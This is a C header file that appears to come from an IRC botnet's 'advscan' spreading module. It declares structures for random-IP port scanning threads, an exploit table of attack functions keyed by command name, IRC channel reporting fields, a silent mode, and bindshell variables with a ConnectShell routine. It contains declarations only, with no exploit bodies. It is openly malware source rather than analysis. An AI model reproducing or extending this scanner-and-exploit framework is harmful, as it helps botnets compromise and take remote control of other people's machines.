#ifndef NO_ADVSCAN
extern char bindshell[];
extern unsigned short bindport;
typedef struct ADVSCAN 
{
	char ip[MAXIP];
	char chan[MAXCHANLEN];
	char msgchan[MAXCHANLEN];
	SOCKET sock;
	unsigned short port;
	unsigned int delay;
	unsigned int minutes;
	unsigned int threadnum;
	unsigned int cthreadnum;
	unsigned int cthreadid;
	unsigned int threads;
	int exploit;
	DWORD host;
	BOOL notice;
	BOOL silent;
	BOOL random;
	BOOL gotinfo;
	BOOL cgotinfo;

} ADVSCAN;

typedef struct ADVINFO 
{
	unsigned long ip;
	BOOL info;

} ADVINFO;

typedef struct EXINFO 
{
	SOCKET sock;
	char ip[MAXIP];
	char chan[MAXCHANLEN];
	char command[10];
	unsigned short port;
	unsigned int threadnum;
	int exploit;
	BOOL option;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} EXINFO;

typedef BOOL (*efref)(EXINFO exinfo);

typedef struct EXPLOIT 
{
	char command[15];
	char name[30];
	unsigned short port;
	efref exfunc;
	unsigned int stats;
	//need to add scanstats.
	BOOL ftp;

} EXPLOIT;

typedef struct recvhdr 
{
	struct iphdr ip;
	struct tcphdr2 tcp;
	unsigned char junk_data[65535];

} RECVHEADER;

BOOL ConnectShell(EXINFO exinfo, unsigned int connectport);
void CheckServers(ADVSCAN scan);
unsigned long AdvGetNextIP(int threadnum);
unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum);
BOOL AdvPortOpen(unsigned long ip, unsigned short port, unsigned int delay);
DWORD WINAPI AdvPortScanner(LPVOID param);
DWORD WINAPI AdvScanner(LPVOID param);

#endif
